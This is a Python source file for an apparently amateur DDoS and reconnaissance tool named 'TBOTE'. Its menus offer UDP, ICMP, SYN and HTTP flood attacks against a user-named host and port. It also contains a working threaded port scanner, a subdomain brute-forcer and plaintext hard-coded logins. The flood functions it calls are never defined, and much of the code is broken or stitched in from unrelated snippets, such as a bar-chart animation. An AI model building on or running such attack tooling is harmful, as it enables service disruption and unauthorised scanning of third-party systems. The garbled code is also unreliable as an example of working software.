  #!/usr/bin/env python3
#-*- coding: utf-8 -*-
import time
import calendar
import ctypes
import sys
import numpy as np
import matplotlib.pyplot as plt
import matplotlib.animation as animation
from matplotlib import animation
import matplotlib.pyplot as plt; plt.rcdefaults()
import pandas as pd
import matplotlib.pyplot as plt
import matplotlib.animation as animation
import matplotlib.ticker as ticker
import matplotlib.animation as animation
import socket
import time
import random
import threading
import getpass
import time
import os
from random import seed
from random import random
from alive_progress import alive_bar
import webbrowser

sys.stdout.write("\x1b]2;WELCOME TO THE BEGINNING OF THE END ALSO KNOWN AS TBOTE\x07")
def modifications():
    print ("Contact Misfortune or Reaper the script is currently under maitnance")
    on_enter = input("Please press enter to leave")
    main()  
#column:65
ar246831=""
method = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mDDoS METHODS\033[91m                     ║               
║══════════════════════════════════════════════════════║
║ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m UDP ATTACK\033[91m    ║
║ \033[00mICMP <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m ICMP ATTACK\033[91m   ║
║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m SYN ATTACK\033[91m    ║
║ \033[00mHTTP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m|\033[00m HTTP ATTACK\033[91m   ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

info = """
[\033[91mTBOTE\033[00m] \033[91m ... The less you know the better...
Bigest attack: 31.9 gbps
"""

version = "3.2"

help = """\033[91m
╔══════════════════════════════════════════════════════╗
║                    \033[00mBASIC COMMANDS\033[91m                    ║
║══════════════════════════════════════════════════════║
║ \033[00mClear                         \033[91m|\033[00m CLEAR SCREEN\033[91m         ║
║ \033[00m\q                            \033[91m|\033[00m EXIT PROGRAM\033[91m         ║
║ \033[00mMethods                       \033[91m|\033[00m TBOTE METHODS\033[91m        ║
║ \033[00mTools                         \033[91m|\033[00m BASIC TOOLS\033[91m          ║
║ \033[00mUpdates                       \033[91m|\033[00m DISPLAY UPDATE NOTES\033[91m ║
║ \033[00mInfo                          \033[91m|\033[00m DISPLAY TBOTE INFO\033[91m   ║
║ \033[00mfeedback                      \033[91m|\033[00m SEND FEEDBACK\033[91m        ║
╚══════════════════════════════════════════════════════╝
"""

tools = """\033[91m
╔══════════════════════════════════════════════════════╗
║                        \033[00mTOOLS\033[91m                         ║
║══════════════════════════════════════════════════════║
║ \033[00mStopattacks                   \033[91m|\033[00m STOP ALL ATTACKS\033[91m     ║
║ \033[00mAttacks                       \033[91m|\033[00m RUNNING ATTACKS\033[91m      ║
║ \033[00mPing <HOST>                   \033[91m|\033[00m PING A HOST\033[91m          ║
║ \033[00mResolve <HOST>                \033[91m|\033[00m GRAB A DOMIANS IP\033[91m    ║
║ \033[00mPortscan <HOST> <RANGE>       \033[91m|\033[00m PORTSCAN A HOST  \033[91m    ║
║ \033[00mDnsresolve <HOST>             \033[91m|\033[00m GRAB ALL SUB-DOMAINS\033[91m ║
║ \033[00mStats                         \033[91m|\033[00m DISPLAY SINFULL STATS\033[91m║
╚══════════════════════════════════════════════════════╝\033[00m
"""

updatenotes = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mUPDATE NOTES\033[91m                     ║
║══════════════════════════════════════════════════════║
║ \033[00m- Better ascii menu\033[91m                                  ║
║ \033[00m- Updated command casing no longer only capital\033[91m      ║
║ \033[00m- Updated attack methods\033[91m                             ║
║ \033[00m- Timeout bug fixed\033[91m                                  ║
║ \033[00m- Background attacks\033[91m                                 ║
║ \033[00m- Running task displayer\033[91m                             ║
║ \033[00m- All tools fixed and working\033[91m                        ║
╚══════════════════════════════════════════════════════╝\033[00m

"""
statz = """

║              \033[00mSTATS\033[91m                     ║

\033[00m- Attacks: \033[91m{}                                        
\033[00m- Found Domains: \033[91m{}                                  
\033[00m- PINGS: \033[91m{}                                          
\033[00m- PORTSCANS: \033[91m{}                                      
\033[00m- GRABBED IPS: \033[91m{}                                 
╚══════════════════════════════════════════════════════╝\033[00m"""
banner = """\033[1;00m

WELCOME!...

WHAT WILL YOU DO WITH THIS POWER?...
                       \033[1;91m罪 深 い\033[00m
"""

altbanner = """
                YOU HAVE CLEARED THE CONSOLE 
                   NOW WHAT WILL YOU DO?
"""
yy=2021
date =calendar.calendar(yy)
cookie = open(".sinfull_cookie","w+")
aas=1
assa=1
fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True
me ="thx"
timername ="pr"
def sec():
    sec = input("how long should the text last?: ")
 
def feedback():
    while True:
        amount = input("FEEDBACK:  ")
        try:
            val = str(amount)
            x = amount.count(amount)
            if amount == "":
                print("Error processing please try again")
                x = 1
                for i in range (1):
                    x = x+1
                    if x >=2:
                        print("we know ur are trying to do that on purpose STOP")
            else:
                print("\033[1;00m[\033[91mTHANKS FOR THE FEEDBACK!\033[1;00m]\033[91m\033[00m ")
                main()
        except ValueError:
            print("Amount must be a word, please try again")
    return val
# define the countdown func. 
def countdown(t): 
    
    while t: 
        mins, secs = divmod(t, 60) 
        timer = '{:02d}:{:02d}'.format(mins, secs) 
        print(timer, end ="\r") 
        time.sleep(1) 
        t -= 1
    
    print('PROCESS COMPLETE') 


# input time in seconds 
t = 5

def security(sec):
    sin = input("\033[1;00m[\033[91mSECURITY\033[1;00m]\033[91m---!>\033[00m ").lower()
    try:
            sinput = sin.split(" ")[0]
            print (altbanner)
            print ("ACTIVATED")
            time.sleep(.2)
            os.system ("clear")
            print("this program's security is based off a username and password system. If you have any questions please give us your feedback: enter to continue")
            input()
            os.system(clear)
            print("Questions?")
    except KeyboardInterrupt:
        print ("\nCTRL-C Pressed")
        exit()
def barchartiscool():       
    df = pd.read_csv('https://gist.githubusercontent.com/johnburnmurdoch/4199dbe55095c3e13de8d5b2e5e5307a/raw/fa018b25c24b7b5f47fd0568937ff6c04e384786/city_populations', 
                    usecols=['name', 'group', 'year', 'value'])
    df.head(3)
    current_year = 2020
    dff = (df[df['year'].eq(current_year)]
        .sort_values(by='value', ascending=True)
        .head(10))
    dff
    fig, ax = plt.subplots(figsize=(15, 8))
    ax.barh(dff['name'], dff['value'])
    colors = dict(zip(
        ['India', 'Europe', 'Asia', 'Latin America',
         'Middle East', 'North America', 'Africa'],
        ['#adb0ff', '#ffb3ff', '#90d595', '#e48381',
        '#aafbff', '#f7bb5f', '#eafb50']
    ))
    group_lk = df.set_index('name')['group'].to_dict()
    fig, ax = plt.subplots(figsize=(15, 8))
    dff = dff[::-1]   # flip values from top to bottom
    # pass colors values to `color=`
    ax.barh(dff['name'], dff['value'], color=[colors[group_lk[x]] for x in dff['name']])
    # iterate over the values to plot labels and values (Tokyo, Asia, 38194.2)
    for i, (value, name) in enumerate(zip(dff['value'], dff['name'])):
      ax.text(value, i,     name,            ha='right')  # Tokyo: name
      ax.text(value, i-.25, group_lk[name],  ha='right')  # Asia: group name
      ax.text(value, i,     value,           ha='left')   # 38194.2: value
    # Add year right middle portion of canvas
    ax.text(1, 0.4, current_year, transform=ax.transAxes, size=46, ha='right')
    fig, ax = plt.subplots(figsize=(15, 8))
    def draw_barchart(year):
         dff = df[df['year'].eq(year)].sort_values(by='value', ascending=True).tail(10)
         ax.clear()
         ax.barh(dff['name'], dff['value'], color=[colors[group_lk[x]] for x in dff['name']])
         dx = dff['value'].max() / 200
         for i, (value, name) in enumerate(zip(dff['value'], dff['name'])):
             ax.text(value-dx, i,     name,           size=14, weight=600, ha='right', va='bottom')
             ax.text(value-dx, i-.25, group_lk[name], size=10, color='#444444', ha='right', va='baseline')
             ax.text(value+dx, i,     f'{value:,.0f}',  size=14, ha='left',  va='center')
        # ... polished styles
         ax.text(1, 0.4, year, transform=ax.transAxes, color='#777777', size=46, ha='right', weight=800)
         ax.text(0, 1.06, 'Population (thousands)', transform=ax.transAxes, size=12, color='#777777')
         ax.xaxis.set_major_formatter(ticker.StrMethodFormatter('{x:,.0f}'))
         ax.xaxis.set_ticks_position('top')
         ax.tick_params(axis='x', colors='#777777', labelsize=12)
         ax.set_yticks([])
         ax.margins(0, 0.01)
         ax.grid(which='major', axis='x', linestyle='-')
         ax.set_axisbelow(True)
         ax.text(0, 1.12, 'The most populous cities in the world from 1500 to 2018',
         transform=ax.transAxes, size=24, weight=600, ha='left')
         ax.text(1, 0, 'by @pratapvardhan; credit @jburnmurdoch', transform=ax.transAxes, ha='right',
         color='#777777', bbox=dict(facecolor='white', alpha=0.8, edgecolor='white'))
         plt.box(False)
    
    draw_barchart(2020)
    fig, ax = plt.subplots(figsize=(15, 8))
    animator = animation.FuncAnimation(fig, draw_barchart, frames=range(1968, 2019))
    HTML(animator.to_jshtml()) 
# or use animator.to_html5_video() or animator.save() 
    with plt.xkcd():
        fig, ax = plt.subplots(figsize=(15, 8))
        draw_barchart(2021)
def tbote():
    print("WELCOME TO THE BEGINING OF THE END...")
    time.sleep(5)
    os.system("clear")
    print("THIS PROGRAM RUNS YOUR WORST NIGHTMARES >:)")
    time.sleep(5)
    os.system("clear")
    print("HAVE FUN...")
    time.sleep(5)
    os.system("clear")
    print("IS THERE A REASON YOU ARE RUNNING THIS?...")
    time.sleep(10)
    try:
        users = ["root", "ar246831"]
        clear = "clear"
        os.system (clear)
        username = getpass.getpass ("[+]")
        if username in users:
            user = username
            print("WELCOME...")
        else:
            print("<--WRONG-->")
    except KeyboardInterrupt:
        print ("\nCTRL-C Pressed")
        exit()

syntaxname=""
seed(1)
for _ in range(10):
    value = random()
seed(2)
for _ in range(100):
    value2 = random()

def compute():
    for i in range(15):
        time.sleep(.1)  # some processing here
        yield  # insert these


def ar246831():
    print("WELCOME TO SPECIAL MODE")
    sin = input("\033[1;00m[\033[91mSPECIAL MODE\033[1;00m]\033[91m---!>\033[00m ").lower()
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp
    global syn
    global icmp
    global http
    try:
        users = ["root", "ar246831"]
        clear = "clear"
        os.system (clear)
        username = getpass.getpass ("[+]")
        if username in users:
            user = username
            sinput = sin.split(" ")[0]
            if sinput == "clear":
                os.system ("clear")
                print (altbanner)
                ar246831()
            elif sinput == "special":
                seed(1)
                for _ in range(10):
                    value = random()
                print(value)
                print ("ACTIVATED")
                syntaxname="ACTIVE"
                time.sleep(2)
                os.system ("clear")
        else:
            print("<--WRONG-->")
    except KeyboardInterrupt:
        print ("\nCTRL-C Pressed")
        exit()
def enter():                
    try:
        users = ["root", "ar246831",]
        clear = "clear"
        os.system (clear)
        username = getpass.getpass ("[+]")
        if username in users:
            user = username
            print("ACTIVE")
            timername="10%"
            time.sleep(.9)
            os.system(clear)
            countdown(t)
            time.sleep(1)
            os.system(clear)
            print(f"{timername}")
            time.sleep(.9)
            os.system(clear)
            timername="25%"
            print(f"{timername}")
            time.sleep(.9)
            os.system(clear)
            timername="50%"
            print(f"{timername}")
            time.sleep(.9)
            os.system(clear)
            timername="75%"
            print(f"{timername}")
            time.sleep(.9)
            os.system(clear)
            timername="100%"
            print(f"{timername}")
            time.sleep(.9)
            os.system(clear)
            with alive_bar(3) as bar:
                for i in compute():
                    bar()
            os.system(clear)
            timername="<--LOADED-->"
            print(f"{timername}")
            time.sleep(.9)
            os.system(clear)
            print("COMPLETED")
            time.sleep(.5)
            os.system(clear)
            print("Exiting")
            time.sleep(.5)
            os.system(clear)
        else:
            print("<--WRONG-->")
    except KeyboardInterrupt:
        print ("\nCTRL-C Pressed")
        exit()
def stopwatch():
    print('Press ENTER to begin. Afterwards, press ENTER to "click" the stopwatch. Press Ctrl-C to quit.')
    input()                    # press Enter to begin
    print('Started.')
    startTime = time.time()    # get the first laps start time
    lastTime = startTime
    lapNum = 1
    try:
        while True:
            totalTime = round(time.time() - startTime, 2)
            print('Lap #%s: %s' % (lapNum, totalTime), end='')
            time.sleep(.0000000000000001)
            input()
            lapTime = round(time.time() - lastTime, 2)
            print('Lap #%s: %s (%s)' % (lapNum, totalTime, lapTime), end='')
            lapNum += 1
            lastTime = time.time() # reset the last lap time
    except KeyboardInterrupt:
       # Handle the Ctrl-C exception to keep its error message from displaying.
        print('\nDone.')


def complete():
    exit()

def ar():
    sin = input("\033[1;00m[\033[91mAR\033[1;00m]\033[91m---!>\033[00m ").lower()
    try:
        users = ["root", "ar246831"]
        clear = "clear"
        os.system (clear)
        username = getpass.getpass ("[+]")
        if username in users:
            user = username
            sinput = sin.split(" ")[0]
            on_yes = input("CONFIRM? : ENTER AND TYPE 'YES' TO CONTINUE")
            if sinput == "clear":
                os.system ("clear")
                print (altbanner)
        else:
            print("<--WRONG-->")
    except KeyboardInterrupt:
        print ("\nCTRL-C Pressed")
        exit()
def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp
    global syn
    global icmp
    global http

    while True:
        sys.stdout.write("\x1b]2;THE BEGINNING OF THE END\x07")
        sin = input(f"\033[1;00m[\033[91mTHE BEGINING OF THE END...{syntaxname}\033[1;00m]\033[91m---!>\033[00m ")
        sinput = sin.split(" ")[0]
        if sinput == "clear":
            os.system ("clear")
            print (altbanner)
            main()
        elif sinput == "help":
            print (help)
            main()
        elif sinput == "":
            main()
        elif sinput == "end":
            exit()
        elif sinput == "A":
            print("!!!!----ABORTING----!!!!")
            complete()
        elif sinput == "version":
            print ("sinful version: "+version+" ")
        elif sinput == "stats":
            print ("\033[00m- Attacks: \033[91m{}                                        ".format (tattacks))
            print ("\033[00m- Found Domains: \033[91m{}                                  ".format(fsubs))
            print ("\033[00m- PINGS: \033[91m{}                                          ".format(tpings))
            print ("\033[00m- PORTSCANS: \033[91m{}                                      ".format(pscans))
            print ("\033[00m- GRABBED IPS: \033[91m{}\n                                    ".format(liips))
            main()
        elif sinput == "methods":
            print (method)
            main()
        elif sinput =="active":
            print(active)
        elif sinput == "tools":
            print (tools)
            main()
        elif sinput == "something":
            somethingasd()
        elif sinput == "246831":
            ar246831()
        elif sinput == "enter":
            print("welcome")
            time.sleep(2)
            enter()
        elif sinput =="tbote":
            tbote()
        elif sinput == "portscan":
            port_range = int(sin.split(" ")[2])
            pscans += 1
            def scan(port, ip):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((ip, port))
                    print ("[\033[91mTHE BEGINING OF THE END\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
                    sock.close()
                except socket.error:
                    return
                except KeyboardInterrupt:
                    print ("\n")
            for port in range(1, port_range+1):
                ip = socket.gethostbyname(sin.split(" ")[1])
                threading.Thread(target=scan, args=(port, ip)).start()
        elif sinput == "updates":
            print (updatenotes)
            main()
        elif sinput == "info":
            print (info)
            main()
        elif sinput == "date":
            print(date)
        elif sinput == "?":
            modifications()
        elif sinput == "ar":
            ar()
        elif sinput == "security":
            security(sec)
        elif sinput == "stopwatch":
            stopwatch()
        elif sinput == "feedback":
            feedback()
        elif sinput == "thank":
            print("such manners, thank you!")
        elif sinput == "YES":
                print ("YES ENTERED <> PRESS KEY 'A' TO ABORT OR ENTER TO CONTINUE")
                on_enter = main()
                on_key = exit()
        elif sinput == "why-not":
       	    webbrowser.open('https://google.com')
        elif sinput == "attacks":
            print ("\n[\033[91mSIN\033[00m] UPD Running processes: {}".format (uaid))
            print ("[\033[91mSIN\033[00m] ICMP Running processes: {}".format (iaid))
            print ("[\033[91mSIN\033[00m] SYN Running processes: {}".format (said))
            print ("[\033[91mSIN\033[00m] Total attacks running: {}\n".format (aid))
            main()
        elif sinput == "dnsresolve":
            sfound = 0
            sys.stdout.write("\x1b]2;THE BEGINNING OF THE END |{}| F O U N D\x07".format (sfound))
            try:
                host = sin.split(" ")[1]
                with open(r"/usr/share/sinfull/subnames.txt", "r") as sub:
                    domains = sub.readlines()   
                for link in domains:
                    try:
                        url = link.strip() + "." + host
                        subips = socket.gethostbyname(url)
                        print ("[\033[91mSIN\033[00m] Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
                        sfound += 1
                        fsubs += 1
                        sys.stdout.write("\x1b]2;S I N F U L L |{}| F O U N D\x07".format (sfound))
                    except socket.error:
                        pass
                        #print ("[\033[91mSIN\033[00m] Domain: {} [\033[91mNON-EXISTANT\033[00m]".format(url))
                print ("[\033[91mSIN\033[00m] Task complete | found: {}".format(sfound))
                main()
            except IndexError:
                print ('ADD THE HOST!')
        elif sinput == "resolve":
            liips += 1
            host = sin.split(" ")[1]
            host_ip = socket.gethostbyname(host)
            print ("[\033[91mSIN\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
            main()
        elif sinput == "ping":
            tpings += 1
            try:
                sinput, host, port = sin.split(" ")
                print ("[\033[91mSIN\033[00m] Starting ping on host: {}".format (host))
                try:
                    ip = socket.gethostbyname(host)
                except socket.gaierror:
                    print ("[\033[91mSIN\033[00m] Host un-resolvable")
                    main()
                while True:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        start = time.time() * 1000
                        sock.connect ((host, int(port)))
                        stop = int(time.time() * 1000 - start)
                        sys.stdout.write("\x1b]2;THE BEGINING OF END|{}ms| \x07".format (stop))
                        print ("Sinfull: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
                        sock.close()
                        time.sleep(1)
                    except socket.error:
                        sys.stdout.write("\x1b]2;S I N F U L L |TIME OUT| D E M O N S\x07")
                        print ("Sinfull: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
                        time.sleep(1)
                    except KeyboardInterrupt:
                        print("")
                        main()
            except ValueError:
                print ("[\033[91mTBOTE\033[00m] The command {} requires an argument".format (sinput))
                main()
        elif sinput == "udp":
            if username == "guests":
                print ("[\033[91mTBOTE\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer, pack = sin.split(" ")
                    socket.gethostbyname(host)
                    print ("Attack sent to: {}".format (host))
                    punch = random._urandom(int(pack))
                    threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
                except ValueError:
                    print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "http":
            try:
                sinput, host, port, timer, pack = sin.split(" ")
                socket.gethostbyname(host)
                print ("Attack sent to: {}".format (host))
                punch = random._urandom(int(pack))
                threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
            except ValueError:
                print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
                main()
            except socket.gaierror:
                print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
                main()
        elif sinput == "icmp":
            if username == "guests":
                print ("[\033[91mSIN\033[00m] You are not allowed to use this method")
                main()
            else:
                try:
                    sinput, host, port, timer, pack = sin.split(" ")
                    socket.gethostbyname(host)
                    print ("Attack sent to: {}".format (host))
                    punch = random._urandom(int(pack))
                    threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
                except ValueError:
                    print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
                    main()
                except socket.gaierror:
                    print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
                    main()
        elif sinput == "syn":
            try:
                sinput, host, port, timer, pack = sin.split(" ")
                socket.gethostbyname(host)
                print ("Attack sent to: {}".format (host))
                punch = random._urandom(int(pack))
                threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
            except ValueError:
                print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
                main()
            except socket.gaierror:
                print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
                main()
        elif sinput == "stopattacks":
            attack = False
            while not attack:
                if aid == 0:
                    attack = True
        elif sinput == "stop":
            what = sin.split(" ")[1]
            if what == "udp":
                print ("Stoping all udp attacks")
                udp = False
                while not udp:
                    if aid == 0:
                        print ("[\033[91mSIN\033[00m] No udp Processes running.")
                        udp = True
                        main()
            if what == "icmp":
                print ("Stopping all icmp attacks")
                icmp = False
                while not icmp:
                    print ("[\033[91mSIN\033[00m] No ICMP processes running")
                    udp = True
                    main()
        else:
            print ("[\033[91mTBOTE\033[00m] {} Not a command".format(sinput))
            main()



try:
        users = ["root", "guests", "ar246831"]
        clear = "clear"
        os.system (clear)
        username = getpass.getpass ("[+]")
        if username in users:
            user = username
        else:
            print ("!--WRONG--!")
            exit()
except KeyboardInterrupt:
        print ("\nCTRL-C Pressed")
        exit()
try:
        passwords = ["root", "gayman", "Porygon793@"]
        password = getpass.getpass ("[+]")
        if user == "root":
            if password == passwords[0]:
                print ("[+] Login correct")
                cookie.write("DIE")
                time.sleep(0)
                os.system (clear)
                try:
                    os.system ("clear")
                    print (banner)
                    main()
                except KeyboardInterrupt:
                    print ("\n[\033[91mSIN\033[00m] EXITING ")
                    main()
            else:
                print ("[+] PERMISSION DENIED, EXITING")
                exit()
        if user == "ar246831":
            if password == passwords[2]:
                print ("[+] WELCOME AR")
                time.sleep(4)
                os.system (clear)
                try:
                    os.system ("clear")
                    print (banner)
                    main()
                except KeyboardInterrupt:
                    print ("\n[\033[91mTBOTE\033[00m] EXITING")
                    
            else:
                print ("[+] Incorrect, exiting")
                exit()

except KeyboardInterrupt:
        exit()      
